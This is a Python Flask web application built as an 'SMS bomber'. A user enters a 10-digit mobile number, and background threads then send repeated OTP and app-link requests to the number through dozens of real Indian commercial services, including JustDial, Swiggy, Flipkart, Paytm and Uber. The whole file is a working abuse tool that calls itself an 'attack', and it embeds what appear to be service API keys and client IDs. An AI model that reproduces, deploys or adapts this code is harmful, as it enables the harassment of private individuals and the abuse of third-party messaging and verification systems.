import os
import time
import requests
import threading
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
active_tasks = {}

def send_bomber(mobile):
    count = 1
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*"
    }

    while active_tasks.get(mobile):
        print(f"--- Bombing Round {count} Started for {mobile} ---")
        
        # 1. JustDial (GET)
        try: session.get(f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={mobile}", headers=headers, timeout=5)
        except: pass

        # 2. ConfirmTkt (POST)
        try: session.post("https://securedapi.confirmtkt.com/api/platform/register", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 3. Allen Solly (POST)
        try: session.post("https://www.allensolly.com/capillarylogin/validateMobileOrEMail", data={"mobileoremail": mobile}, headers=headers, timeout=5)
        except: pass

        # 4. Housing.com (POST)
        try: session.post("https://login.housing.com/api/v2/send-otp", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 5. Ajio (POST)
        try: session.post("https://login.web.ajio.com/api/auth/signupSendOTP", json={"mobileNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 6. Unacademy (POST)
        try: session.post("https://unacademy.com/api/v1/user/get_app_link/", data={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 7. Treebo (POST)
        try: session.post("https://www.treebo.com/api/v2/auth/login/otp/", json={"phone_number": mobile}, headers=headers, timeout=5)
        except: pass

        # 8. PharmEasy (POST)
        try: session.post("https://pharmeasy.in/api/auth/requestOTP", json={"contactNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 9. Dream11 (POST)
        try: session.post("https://api.dream11.com/sendsmslink", json={"mobileNum": mobile}, headers=headers, timeout=5)
        except: pass

        # 10. Cashify (GET)
        try: session.get(f"https://www.cashify.in/api/cu01/v1/app-link?mn={mobile}", headers=headers, timeout=5)
        except: pass

        # 11. KFC (POST)
        try: session.post("https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", json={"phoneNumber": mobile}, headers=headers, timeout=5)
        except: pass

        # 12. Airtel (GET)
        try: session.get(f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={mobile}", headers=headers, timeout=5)
        except: pass

        # 13. HappyEasyGo (GET)
        try: session.get(f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{mobile}", headers=headers, timeout=5)
        except: pass

        # 14. Porter (POST)
        try: session.post("https://porter.in/restservice/send_app_link_sms", json={"phone": mobile}, headers=headers, timeout=5)
        except: pass

        # 15. IndiaLends (POST)
        try: session.post("https://indialends.com/internal/a/mobile-verification_v2.ashx", data={"jfsdfu14hkgertd": mobile}, headers=headers, timeout=5)
        except: pass
        apis = [
    {
        "name": "swiggy",
        "method": "POST",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "data": {"mobile": mobile},
    },
    {
        "name": "zomato",
        "method": "POST",
        "url": "https://www.zomato.com/php/oauth_otp.php",
        "data": {"phone": mobile, "otp_via": "whatsapp"},
    },
    {
        "name": "paytm",
        "method": "POST",
        "url": "https://commonfront.paytm.com/v4/api/sendsms",
        "data": {"phone": mobile, "guid": "2952fa812660c58dc160ca6c9894221d"},
    },
    {
        "name": "amazon",
        "method": "POST",
        "url": "https://www.amazon.in/ap/signin",
        "data": {"email": mobile, "create": "0"},
    },
    {
        "name": "flipkart",
        "method": "POST",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "data": {"loginId": f"+91{mobile}"},
        "headers": {
            "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            "Origin": "https://www.flipkart.com",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    },
    {
        "name": "bigbasket",
        "method": "POST",
        "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/send/",
        "data": {"phone": mobile, "channel": "sms"},
    },
    {
        "name": "dream11",
        "method": "POST",
        "url": "https://api.dream11.com/sendsmslink",
        "data": {"siteId": "1", "mobileNum": mobile, "appType": "androidfull"},
    },
    {
        "name": "airtel",
        "method": "GET",
        "url": "https://www.airtel.in/referral-api/core/notify",
        "data": {"messageId": "map", "rtn": mobile},
    },
    {
        "name": "pharmeasy",
        "method": "POST",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "data": {"contactNumber": mobile},
    },
    {
        "name": "housing",
        "method": "POST",
        "url": "https://login.housing.com/api/v2/send-otp",
        "data": {"phone": mobile},
    },
    {
        "name": "redbus",
        "method": "GET",
        "url": "https://m.redbus.in/api/getOtp",
        "data": {"number": mobile, "cc": "91", "whatsAppOpted": False},
    },
    {
        "name": "myntra",
        "method": "POST",
        "url": "https://www.myntra.com/otp/generate",
        "data": {"phone": mobile},
    },
    {
        "name": "ola",
        "method": "POST",
        "url": "https://api.olacabs.com/v1/oauth/otp",
        "data": {"phone": mobile},
    },
    {
        "name": "rapido",
        "method": "POST",
        "url": "https://rapido.bike/Customer/authenticate",
        "data": {"phone": mobile},
    },
    {
        "name": "snapdeal",
        "method": "POST",
        "url": "https://www.snapdeal.com/authenticate/emailOrMobile",
        "data": {"mobile": mobile, "checkUser": "1"},
    },
    {
        "name": "indialends",
        "method": "POST",
        "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
        "data": {
            "aeyder03teaeare": "1",
            "ertysvfj74sje": "91",
            "jfsdfu14hkgertd": mobile,
            "lj80gertdfg": "0",
        },
        "headers": {"Referer": "https://indialends.com/personal-loan"},
    },
    {
        "name": "grofers",
        "method": "POST",
        "url": "https://grofers.com/v2/accounts/",
        "data": {"user_phone": mobile},
        "headers": {
            "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
        },
    },
    {
        "name": "dominos",
        "method": "POST",
        "url": "https://order.godominos.co.in/Online/Verification.aspx/SendOTP",
        "data": {"MobileNo": mobile},
    },
    {
        "name": "pizzahut",
        "method": "POST",
        "url": "https://www.pizzahut.co.in/account/sendotp",
        "data": {"mobile": mobile, "email": "test@example.com"},
    },
    {
        "name": "treebo",
        "method": "POST",
        "url": "https://www.treebo.com/api/v2/auth/login/otp/",
        "data": {"phone_number": mobile},
    },
    {
        "name": "justdial",
        "method": "GET",
        "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
        "data": {"mobile": mobile},
    },
    {
        "name": "uber",
        "method": "POST",
        "url": "https://auth.uber.com/v2/oauth/token",
        "data": {
            "client_id": "eCAbBp7pFFl4kVJwyvjq1xdWfpeJyu1d",
            "phone": mobile,
            "scope": "eats.order",
        },
    },
]
    for api in apis:
        try:
            if api["method"] == "POST":
                session.post(api["url"], json=api["data"])
            elif api["method"] == "GET":
                session.get(api["url"])
        except:
            pass
            
    print(f"Round {count} Finished.")
    count += 1
    time.sleep(1)



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_bomber():
    mobile = request.form.get('mobile')
    if not mobile or len(mobile) != 10:
        return jsonify({"status": "error", "message": "Invalid 10-digit Number"})
    
    if mobile not in active_tasks or not active_tasks[mobile]:
        active_tasks[mobile] = True
        threading.Thread(target=send_bomber, args=(mobile,)).start()
        return jsonify({"status": "success", "message": f"Multi-API Attack Started on {mobile}"})
    return jsonify({"status": "info", "message": "Already running"})

@app.route('/stop', methods=['POST'])
def stop_bomber():
    mobile = request.form.get('mobile')
    active_tasks[mobile] = False
    return jsonify({"status": "success", "message": "Attack Stopped"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)